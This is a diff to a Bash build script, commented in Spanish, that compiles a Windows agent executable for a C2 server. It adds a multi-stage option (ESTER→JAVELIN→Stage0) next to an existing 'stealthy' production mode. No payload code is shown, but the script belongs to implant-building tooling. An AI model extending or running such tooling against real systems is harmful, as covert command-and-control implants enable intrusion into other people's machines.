@@ -23,6 +23,7 @@ SERVER_PORT=${SERVER_PORT:-4444}
 AGENT_NAME=${AGENT_NAME:-agent}
 PRODUCTION_MODE=${PRODUCTION_MODE:-false}
 NO_CACHE=${NO_CACHE:-false}
+MULTI_STAGE=${MULTI_STAGE:-false}
 
 # Parsear argumentos
 while [[ $# -gt 0 ]]; do
@@ -43,6 +44,10 @@ while [[ $# -gt 0 ]]; do
             PRODUCTION_MODE=true
             shift
             ;;
+        --multi-stage)
+            MULTI_STAGE=true
+            shift
+            ;;
         --no-cache)
             NO_CACHE=true
             shift
@@ -55,6 +60,7 @@ while [[ $# -gt 0 ]]; do
             echo "  --port PORT       Puerto del servidor C2 (default: 4444)"
             echo "  --name NAME       Nombre del agente (default: agent)"
             echo "  --production      Compilar en modo producción (stealthy)"
+            echo "  --multi-stage     Compilar sistema multi-stage (ESTER→JAVELIN→Stage0)"
             echo "  --no-cache        Forzar rebuild sin usar caché de Docker"
             echo "  --help            Mostrar esta ayuda"
             echo ""
@@ -62,6 +68,7 @@ while [[ $# -gt 0 ]]; do
             echo "  $0 --ip 192.168.1.10 --port 4444"
             echo "  $0 --ip 203.0.113.50 --production"
             echo "  $0 --name agent-prod --production"
+            echo "  $0 --ip 192.168.1.10 --multi-stage --production"
             exit 0
             ;;
         *)
@@ -77,6 +84,9 @@ echo -e "${YELLOW}📋 Configuración de compilación:${NC}"
 echo -e "   ${BLUE}•${NC} Servidor: ${GREEN}${SERVER_IP}:${SERVER_PORT}${NC}"
 echo -e "   ${BLUE}•${NC} Agente: ${GREEN}${AGENT_NAME}.exe${NC}"
 echo -e "   ${BLUE}•${NC} Modo: ${GREEN}$([ "$PRODUCTION_MODE" = "true" ] && echo "PRODUCCIÓN (stealthy)" || echo "DESARROLLO (debug)")${NC}"
+if [ "$MULTI_STAGE" = "true" ]; then
+    echo -e "   ${BLUE}•${NC} Multi-Stage: ${GREEN}ACTIVADO (ESTER→JAVELIN→Stage0)${NC}"
+fi
 echo ""
 
 # Confirmar
@@ -108,6 +118,7 @@ SERVER_IP=$SERVER_IP \
 SERVER_PORT=$SERVER_PORT \
 AGENT_NAME=$AGENT_NAME \
 PRODUCTION_MODE=$PRODUCTION_MODE \
+MULTI_STAGE=$MULTI_STAGE \
 docker-compose build $COMPOSE_BUILD_FLAGS && docker-compose up
 
 # Verificar resultados
